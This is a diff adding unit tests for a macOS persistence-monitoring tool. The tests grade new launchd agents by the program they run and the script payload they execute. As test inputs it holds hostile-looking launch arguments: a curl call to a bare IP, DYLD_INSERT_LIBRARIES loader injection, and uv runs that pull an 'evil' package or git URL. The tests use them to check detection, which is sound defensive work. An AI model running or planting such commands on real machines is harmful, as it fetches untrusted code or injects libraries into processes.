@@ -103,12 +103,20 @@ class LedgerSandbox(unittest.TestCase):
                                                    "custody.jsonl")),
                      ("HMAC_KEY_FILE", os.path.join(self.state, "hmac.key")),
                      ("RUN_LOG", os.path.join(self.state, "run.log")),
-                     ("_git_provenance", self._git)):
+                     ("VOUCH_FILE", os.path.join(self.state, "vouches.jsonl")),
+                     ("VOUCH_SIGNERS", os.path.join(self.state,
+                                                    "vouch_signers")),
+                     ("FLEET_SIGNERS", os.path.join(self.state,
+                                                    "allowed_signers")),
+                     ("_git_provenance", self._git),
+                     ("_package_receipt", self._receipt_for)):
             self._saved[k] = getattr(aegis, k)
             setattr(aegis, k, v)
         aegis._CUSTODY_CARRY_CACHE.clear()
         self.git_answer = None
         self.git_asked = []
+        # {path: label}: the package-manager receipts this body "holds".
+        self.receipts = {}
 
     def tearDown(self):
         for k, v in self._saved.items():
@@ -119,6 +127,9 @@ class LedgerSandbox(unittest.TestCase):
     def _git(self, path):
         self.git_asked.append(path)
         return self.git_answer
+
+    def _receipt_for(self, path):
+        return self.receipts.get(path)
 
     def _receipt(self, path, sha, mac=None, tool="claude-code"):
         """One intent record as `aegis.py intent hook` writes it, MAC'd with
@@ -333,6 +344,186 @@ class NewItemCarriesItsProducer(LedgerSandbox):
         classes = [c for f in out for c in aegis._finding_producer_classes(f)]
         self.assertEqual(len({k for k, _obs in classes}), 1)
         self.assertEqual(len({obs for _k, obs in classes}), 7)
+
+
+XBAR = "/Applications/xbar.app/Contents/MacOS/xbar"
+PY = "/Users/me/.venv/bin/python3"
+
+
+def _new(name, program=UV, args=None, target_sha=OLD, env=None):
+    """A NEW launchd record whose argv is given verbatim (the payload is
+    derived from it exactly as snapshot_persistence derives it)."""
+    if args is None:
+        args = [program, "run", RUN, name]
+    path = "/Users/me/Library/LaunchAgents/com.kit.%s.plist" % name
+    target = aegis._script_target(args, program)
+    return path, {
+        "label": "com.kit." + name, "program": program, "sha256": UV_SHA,
+        "trust": SUSPICIOUS_TRUST, "run_at_load": False, "authority": None,
+        "env": env, "args": args,
+        "args_sha256": aegis.hashlib.sha256(json.dumps(
+            args, sort_keys=True, default=str).encode()).hexdigest(),
+        "script_target": target,
+        "target_sha": target_sha if target else None}
+
+
+class NewItemIsGradedByWhatItRuns(LedgerSandbox):
+    """#287 #288 #295 #296 #300 #302 #307 (`com.aikit.* -> uv run
+    .../schedule/run.py`) and #399 (xbar) interrupted HIGH because a NEW
+    persistence item was never asked who made what it runs. It is now graded
+    by the two things it executes: the program (the binary ladder,
+    _grade_binary) and the payload (_custody_payload). The item's rung is the
+    WEAKER of the two -- a strong program running an unexplained script
+    explains nothing, and so does an explained script run by an unexplained
+    program -- and any argv that can run code beyond those two earns none."""
+
+    def _one(self, name="doctor", **kw):
+        path, rec = _new(name, **kw)
+        out = aegis.check_persistence({}, {path: rec})
+        self.assertEqual(len(out), 1)
+        self.assertEqual(out[0]["title"], "New persistence item")
+        return out[0]
+
+    def _routes_to_digest(self, f):
+        routing = aegis.route_findings([f], seen={})
+        return routing[f["fingerprint"]]["route"] == aegis.ROUTE_DIGEST
+
+    def test_a_receipted_runner_and_a_committed_payload_is_the_weak_rung(self):
+        """The aikit shape: uv from the cargo-dist installer, run.py in the
+        operator's (unpushed) ledger repo. Vouched program, weak payload: the
+        weaker one, one step, out of the interrupt tier."""
+        self.receipts[UV] = "cargo-dist:astral-sh/uv@0.11.6"
+        self.git_answer = "local-commit"
+        f = self._one()
+        self.assertEqual(f["custody"], "local-commit")
+        self.assertEqual(f["severity"], "MEDIUM")
+        self.assertTrue(self._routes_to_digest(f))
+
+    def test_the_weaker_half_wins_even_over_a_self_attested_payload(self):
+        """A payload an agent wrote under supervision is LOW on its own; run
+        by a program that is merely package-managed, the item is only as
+        explained as that program."""
+        self.receipts[UV] = "cargo-dist:astral-sh/uv@0.11.6"
+        self._receipt(RUN, OLD)
+        f = self._one()
+        self.assertEqual(f["custody"], "package-managed")
+        self.assertEqual(f["severity"], "MEDIUM")
+
+    def test_a_vouched_program_with_no_payload_goes_to_the_digest(self):
+        """xbar's shape (#399): the program is the whole job."""
+        self.receipts[XBAR] = "homebrew:xbar"
+        f = self._one("xbar", program=XBAR, args=[XBAR])
+        self.assertEqual(f["custody"], "package-managed")
+        self.assertEqual(f["severity"], "MEDIUM")
+        self.assertTrue(self._routes_to_digest(f))
+
+    @unittest.skipUnless("publisher-signed" in aegis._VOUCHED_CUSTODY,
+                         "the publisher-signed rung ships with precision S5")
+    def test_a_publisher_signed_program_with_no_payload_goes_to_the_digest(self):
+        real = aegis._grade_binary
+
+        def signed(severity, path, **kw):
+            if path == XBAR:
+                return (aegis._demote(severity, "publisher-signed"),
+                        "publisher-signed", "signed")
+            return real(severity, path, **kw)
+
+        aegis._grade_binary = signed
+        try:
+            f = self._one("xbar", program=XBAR, args=[XBAR])
+        finally:
+            aegis._grade_binary = real
+        self.assertEqual(f["custody"], "publisher-signed")
+        self.assertTrue(self._routes_to_digest(f))
+
+    def test_a_receipted_runner_with_an_unexplained_payload_has_no_rung(self):
+        self.receipts[UV] = "cargo-dist:astral-sh/uv@0.11.6"
+        f = self._one()
+        self.assertIsNone(f.get("custody"))
+        self.assertEqual(f["severity"], "HIGH")
+
+    def test_an_unexplained_runner_with_a_committed_payload_has_no_rung(self):
+        self.git_answer = "self-committed"
+        f = self._one()
+        self.assertIsNone(f.get("custody"))
+        self.assertEqual(f["severity"], "HIGH")
+
+    def test_hostile_argv_has_no_rung(self):
+        self.receipts[UV] = "cargo-dist:astral-sh/uv@0.11.6"
+        self.git_answer = "self-committed"
+        f = self._one(args=[UV, "run", RUN, "curl", "http://198.51.100.7/x"])
+        self.assertIsNone(f.get("custody"))
+        self.assertIn(f["severity"], ("HIGH", "CRITICAL"))
+
+    def test_a_loader_injection_env_has_no_rung(self):
+        self.receipts[UV] = "cargo-dist:astral-sh/uv@0.11.6"
+        self.git_answer = "self-committed"
+        f = self._one(env={"DYLD_INSERT_LIBRARIES": "/Users/me/x.dylib"})
+        self.assertIsNone(f.get("custody"))
+        self.assertIn(f["severity"], ("HIGH", "CRITICAL"))
+
+    def test_uv_run_with_a_package_has_no_rung(self):
+        """`--with <pkg>` installs and imports code that is neither uv nor
+        run.py. Both spellings: the separate value hides the payload from
+        _script_target, the glued one does not."""
+        self.receipts[UV] = "cargo-dist:astral-sh/uv@0.11.6"
+        self.git_answer = "local-commit"
+        for args in ([UV, "run", "--with", "evil", RUN, "doctor"],
+                     [UV, "run", "--with=evil", RUN, "doctor"]):
+            f = self._one(args=args)
+            self.assertIsNone(f.get("custody"), args)
+            self.assertEqual(f["severity"], "HIGH", args)
+
+    def test_uv_run_from_a_url_has_no_rung(self):
+        self.receipts[UV] = "cargo-dist:astral-sh/uv@0.11.6"
+        self.git_answer = "local-commit"
+        f = self._one(args=[UV, "run", RUN, "--from",
+                            "git+https://example.invalid/evil"])
+        self.assertIsNone(f.get("custody"))
+
+    def test_an_interpreter_running_a_module_has_no_rung(self):
+        """`python -m pkg` runs code named by the argv, not a file this
+        graded."""
+        self.receipts[PY] = "uv-python:cpython-3.12"
+        f = self._one(program=PY, args=[PY, "-m", "pkg.cli"])
+        self.assertIsNone(f.get("custody"))
+
+    def test_a_launcher_that_names_its_target_has_no_rung(self):
+        """`open -b <bundle id>` starts an app no argument is a path to; a
+        program handed a path may load it. Neither is explained by the
+        program's own receipt."""
+        opener = "/usr/bin/open"
+        self.receipts[opener] = "os:open"
+        self.receipts[XBAR] = "homebrew:xbar"
+        for program, args in ((opener, [opener, "-b", "com.example.app"]),
+                              (XBAR, [XBAR, "--plugin",
+                                      "/Users/me/plugin.dylib"])):
+            f = self._one("x", program=program, args=args)
+            self.assertIsNone(f.get("custody"), args)
+
+    def test_an_unhashed_payload_explains_nothing(self):
+        self.receipts[UV] = "cargo-dist:astral-sh/uv@0.11.6"
+        self.git_answer = "local-commit"
+        f = self._one(target_sha=None)
+        self.assertIsNone(f.get("custody"))
+
+    def test_arguments_after_the_payload_are_its_input(self):
+        """Everything after the script is handed to the script, which is
+        graded; a path there is data, not another program."""
+        self.receipts[PY] = "uv-python:cpython-3.12"
+        self.git_answer = "local-commit"
+        f = self._one(program=PY, args=[PY, RUN, "/Users/me/data", "--all"])
+        self.assertEqual(f["custody"], "local-commit")
+        self.assertEqual(f["severity"], "MEDIUM")
+
+    def test_a_shared_program_and_payload_are_graded_once_per_scan(self):
+        self.receipts[UV] = "cargo-dist:astral-sh/uv@0.11.6"
+        self.git_answer = "local-commit"
+        cur = dict(_new(name) for name in LABELS)
+        out = aegis.check_persistence({}, cur)
+        self.assertEqual(len(out), 7)
+        self.assertEqual({f["custody"] for f in out}, {"local-commit"})
+        self.assertEqual(self.git_asked, [RUN])
 
 
 class OneVerdictAcceptsEveryReferringJob(LedgerSandbox):
